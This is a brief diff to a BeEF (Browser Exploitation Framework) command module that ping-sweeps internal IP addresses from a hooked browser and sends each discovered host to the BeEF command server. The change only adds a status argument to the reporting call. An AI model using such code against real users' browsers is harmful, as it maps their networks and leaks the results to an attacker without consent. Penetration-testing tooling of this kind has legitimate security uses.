@@ -57,7 +57,7 @@ beef.execute(function() {
     if(ips.length>1) {
 	    var int_id = setInterval( function() { 
 		var host = do_scan(ips[i++],timeout);
-		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
+		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host, beef.are.status_success());
 		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
     	}, delay);
     } else {
